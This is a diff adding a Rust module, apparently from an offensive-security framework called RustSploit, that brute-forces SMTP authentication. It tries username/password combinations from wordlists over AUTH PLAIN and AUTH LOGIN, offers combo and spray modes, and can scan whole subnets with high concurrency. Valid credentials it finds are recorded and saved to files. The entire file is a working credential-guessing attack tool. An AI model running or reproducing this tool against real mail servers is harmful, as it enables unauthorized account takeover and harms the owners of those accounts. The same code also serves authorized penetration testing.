@@ -1,0 +1,396 @@
+use anyhow::{Context, Result, anyhow};
+use base64::{Engine as _, engine::general_purpose};
+use colored::*;
+use std::io::{BufRead, BufReader, Write};
+use std::net::TcpStream;
+use std::net::{IpAddr, ToSocketAddrs};
+use std::time::Duration;
+
+/// Default SMTP timeout in milliseconds (10 seconds).
+/// Real SMTP servers often do reverse DNS lookups on connect, taking 5-10s.
+const DEFAULT_TIMEOUT_MS: u64 = 10_000;
+
+use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
+use crate::utils::{
+    BruteforceConfig, LoginResult, SubnetScanConfig, generate_combos_mode, is_subnet_target,
+    load_credential_file, parse_combo_mode, run_bruteforce, run_subnet_bruteforce,
+};
+use crate::utils::{
+    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
+    cfg_prompt_yes_no, load_lines,
+};
+
+pub fn info() -> crate::module_info::ModuleInfo {
+    crate::module_info::ModuleInfo {
+        name: "SMTP Brute Force".to_string(),
+        description: "Brute-force SMTP authentication supporting PLAIN and LOGIN mechanisms. Tests credentials against mail servers with combo mode and subnet scanning.".to_string(),
+        authors: vec!["RustSploit Contributors".to_string()],
+        references: vec![],
+        disclosure_date: None,
+        rank: crate::module_info::ModuleRank::Normal,
+        default_port: Some(25),
+    }
+}
+
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("smtp_bruteforce requires a single-host target")?;
+    crate::mprintln!(
+        "\n{}",
+        "=== SMTP Bruteforce Module (RustSploit) ===".bold().cyan()
+    );
+    crate::mprintln!();
+
+    // --- Subnet Scan Mode ---
+    if is_subnet_target(target) {
+        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
+
+        let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535).await? as u16;
+        let usernames_file =
+            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+        let passwords_file =
+            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+        let users = load_lines(&usernames_file)?;
+        let passes = load_lines(&passwords_file)?;
+        if users.is_empty() {
+            return Err(anyhow!("User list empty"));
+        }
+        if passes.is_empty() {
+            return Err(anyhow!("Pass list empty"));
+        }
+
+        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)
+            .await? as usize;
+        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+        let output_file = cfg_prompt_output_file(
+            "output_file",
+            "Output result file",
+            "smtp_subnet_results.txt",
+        )
+        .await?;
+
+        let limiter = ctx.limiter.clone();
+        let module_path = ctx.module_path.clone();
+        let hits = run_subnet_bruteforce(
+            target,
+            port,
+            users,
+            passes,
+            &SubnetScanConfig {
+                concurrency,
+                verbose,
+                output_file,
+                service_name: "smtp",
+                jitter_ms: 50,
+                source_module: "creds/generic/smtp_credcheck",
+                skip_tcp_check: false,
+                state_file: None,
+            },
+            move |ip: IpAddr, port: u16, user: String, pass: String| {
+                let limiter = limiter.clone();
+                let module_path = module_path.clone();
+                async move {
+                    let target_str = ip.to_string();
+                    limiter.acquire(&module_path, &target_str).await;
+                    let res = tokio::task::spawn_blocking(move || {
+                        try_smtp_login(&target_str, port, &user, &pass, DEFAULT_TIMEOUT_MS)
+                    })
+                    .await;
+                    match res {
+                        Ok(Ok(true)) => LoginResult::Success,
+                        Ok(Ok(false)) => LoginResult::AuthFailed,
+                        Ok(Err(e)) => LoginResult::Error {
+                            message: e.to_string(),
+                            retryable: true,
+                        },
+                        Err(e) => LoginResult::Error {
+                            message: format!("Task panic: {}", e),
+                            retryable: false,
+                        },
+                    }
+                }
+            },
+        )
+        .await?;
+        let mut outcome = ModuleOutcome::ok();
+        for (host, user, pass) in &hits {
+            outcome.findings.push(Finding {
+                target: host.clone(),
+                kind: FindingKind::Credential,
+                message: format!("Valid SMTP credentials found: {}:{}", user, pass),
+                data: Some(serde_json::json!({
+                    "username": user,
+                    "password": pass,
+                    "service": "smtp",
+                    "port": port,
+                })),
+            });
+        }
+        return Ok(outcome);
+    }
+
+    // --- Single Target Mode ---
+    let mut outcome = ModuleOutcome::ok();
+    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535).await? as u16;
+    let username_wordlist =
+        cfg_prompt_existing_file("username_wordlist", "Username wordlist file").await?;
+    let password_wordlist =
+        cfg_prompt_existing_file("password_wordlist", "Password wordlist file").await?;
+
+    let threads = cfg_prompt_int_range("threads", "Threads", 8, 1, 256).await? as usize;
+    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000).await? as u64;
+
+    let stop_on_success =
+        cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", true).await?;
+    let combo_input =
+        cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+    let default_name = format!(
+        "smtp_results_{}.txt",
+        target.replace(['/', ':', '.', '[', ']', '\\'], "_")
+    );
+    let output_file =
+        cfg_prompt_output_file("output_file", "Output file for results", &default_name).await?;
+
+    let usernames = load_lines(&username_wordlist)?;
+    let passwords = load_lines(&password_wordlist)?;
+    if usernames.is_empty() || passwords.is_empty() {
+        anyhow::bail!("Username or password list is empty — nothing to bruteforce");
+    }
+    crate::mprintln!(
+        "[*] Loaded {} usernames, {} passwords",
+        usernames.len(),
+        passwords.len()
+    );
+
+    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
+    if cfg_prompt_yes_no(
+        "cred_file",
+        "Load additional user:pass combos from file?",
+        false,
+    )
+    .await?
+    {
+        let cred_path =
+            cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)")
+                .await?;
+        combos.extend(load_credential_file(&cred_path)?);
+    }
+
+    let limiter = ctx.limiter.clone();
+    let module_path = ctx.module_path.clone();
+    let try_login = move |target: String, port: u16, user: String, pass: String| {
+        let limiter = limiter.clone();
+        let module_path = module_path.clone();
+        async move {
+            limiter.acquire(&module_path, &target).await;
+            let res = tokio::task::spawn_blocking(move || {
+                try_smtp_login(&target, port, &user, &pass, DEFAULT_TIMEOUT_MS)
+            })
+            .await;
+            match res {
+                Ok(Ok(true)) => LoginResult::Success,
+                Ok(Ok(false)) => LoginResult::AuthFailed,
+                Ok(Err(e)) => LoginResult::Error {
+                    message: e.to_string(),
+                    retryable: true,
+                },
+                Err(e) => LoginResult::Error {
+                    message: format!("Task panic: {}", e),
+                    retryable: false,
+                },
+            }
+        }
+    };
+
+    let result = run_bruteforce(
+        &BruteforceConfig {
+            target: target.to_string(),
+            port,
+            concurrency: threads,
+            stop_on_success,
+            verbose,
+            delay_ms,
+            max_retries: 2,
+            service_name: "smtp",
+            jitter_ms: 50,
+            source_module: "creds/generic/smtp_credcheck",
+        },
+        combos,
+        try_login,
+    )
+    .await?;
+
+    result.print_found();
+    result.save_to_file(&output_file)?;
+
+    for (host, user, pass) in &result.found {
+        outcome.findings.push(Finding {
+            target: host.clone(),
+            kind: FindingKind::Credential,
+            message: format!("Valid SMTP credentials found: {}:{}", user, pass),
+            data: Some(serde_json::json!({
+                "username": user,
+                "password": pass,
+                "service": "smtp",
+                "port": port,
+            })),
+        });
+    }
+    Ok(outcome)
+}
+
+/// Read a single SMTP response line (terminated by \n).
+/// Returns the trimmed line or an error on timeout / EOF.
+fn read_smtp_line(reader: &mut BufReader<&TcpStream>) -> Result<String> {
+    let mut line = String::new();
+    let n = reader.read_line(&mut line).context("SMTP read")?;
+    if n == 0 {
+        return Err(anyhow!("Connection closed"));
+    }
+    Ok(line.trim_end().to_string())
+}
+
+fn try_smtp_login(
+    target: &str,
+    port: u16,
+    username: &str,
+    password: &str,
+    timeout_ms: u64,
+) -> Result<bool> {
+    let addr = format!("{}:{}", target, port);
+    let timeout = Duration::from_millis(timeout_ms);
+    let socket = addr
+        .to_socket_addrs()?
+        .next()
+        .ok_or_else(|| anyhow!("Resolution failed"))?;
+    let stream = crate::utils::blocking_tcp_connect(&socket, timeout)?;
+    if let Err(e) = stream.set_nodelay(true) {
+        crate::meprintln!("[!] Socket option error: {}", e);
+    }
+    stream.set_read_timeout(Some(timeout))?;
+    stream.set_write_timeout(Some(timeout))?;
+
+    let mut reader = BufReader::new(&stream);
+    // We write via a reference to the same stream (TcpStream is duplex)
+    let mut writer = &stream;
+
+    // Read banner — expect 220
+    let banner = read_smtp_line(&mut reader).context("Banner read")?;
+    if !banner.starts_with("220") {
+        return Err(anyhow!("No 220 banner"));
+    }
+
+    // Send EHLO
+    writer.write_all(b"EHLO scanner\r\n")?;
+    writer.flush()?;
+
+    let mut login_ok = false;
+    let mut plain_ok = false;
+    let mut ehlo_seen = false;
+
+    // Read multi-line EHLO response (250-... continues, 250 ... ends)
+    // RFC allows arbitrary continuation lines; use generous limit
+    for _ in 0..100 {
+        let line = read_smtp_line(&mut reader).context("EHLO read")?;
+        if line.contains("AUTH") && line.contains("PLAIN") {
+            plain_ok = true;
+        }
+        if line.contains("AUTH") && line.contains("LOGIN") {
+            login_ok = true;
+        }
+        // "250 " (with space) is the final line of the EHLO response
+        if line.starts_with("250 ") {
+            ehlo_seen = true;
+            break;
+        }
+        // If the line doesn't start with 250 at all, something is wrong
+        if !line.starts_with("250") {
+            break;
+        }
+    }
+    if !ehlo_seen {
+        return Ok(false);
+    }
+
+    // Try AUTH PLAIN
+    if plain_ok {
+        let mut blob = vec![0u8];
+        blob.extend(username.as_bytes());
+        blob.push(0);
+        blob.extend(password.as_bytes());
+        let cmd = format!("AUTH PLAIN {}\r\n", general_purpose::STANDARD.encode(&blob));
+        writer.write_all(cmd.as_bytes())?;
+        writer.flush()?;
+
+        let resp = read_smtp_line(&mut reader).context("Auth response")?;
+        if resp.starts_with("235") {
+            if let Err(e) = writer.write_all(b"QUIT\r\n") {
+                crate::meprintln!("[!] Write error: {}", e);
+            }
+            if let Err(e) = writer.flush() {
+                crate::meprintln!("[!] Write error: {}", e);
+            }
+            return Ok(true);
+        }
+        if resp.starts_with('5') {
+            return Ok(false);
+        }
+    }
+
+    // Try AUTH LOGIN
+    if login_ok {
+        writer.write_all(b"AUTH LOGIN\r\n")?;
+        writer.flush()?;
+
+        // Wait for username prompt (334)
+        let prompt1 = read_smtp_line(&mut reader).context("Auth Login prompt")?;
+        if !prompt1.starts_with("334") {
+            return Ok(false);
+        }
+
+        let ucmd = format!(
+            "{}\r\n",
+            general_purpose::STANDARD.encode(username.as_bytes())
+        );
+        writer.write_all(ucmd.as_bytes())?;
+        writer.flush()?;
+
+        // Wait for password prompt (334)
+        let prompt2 = read_smtp_line(&mut reader).context("Auth Pass prompt")?;
+        if !prompt2.starts_with("334") {
+            return Ok(false);
+        }
+
+        let pcmd = format!(
+            "{}\r\n",
+            general_purpose::STANDARD.encode(password.as_bytes())
+        );
+        writer.write_all(pcmd.as_bytes())?;
+        writer.flush()?;
+
+        let resp = read_smtp_line(&mut reader).context("Auth final response")?;
+        if resp.starts_with("235") {
+            if let Err(e) = writer.write_all(b"QUIT\r\n") {
+                crate::meprintln!("[!] Write error: {}", e);
+            }
+            if let Err(e) = writer.flush() {
+                crate::meprintln!("[!] Write error: {}", e);
+            }
+            return Ok(true);
+        }
+        if resp.starts_with('5') {
+            return Ok(false);
+        }
+    }
+
+    Ok(false)
+}
+
+crate::register_native_module!(
+    crate::module::Category::Creds,
+    "generic/smtp_bruteforce",
+    native
+);
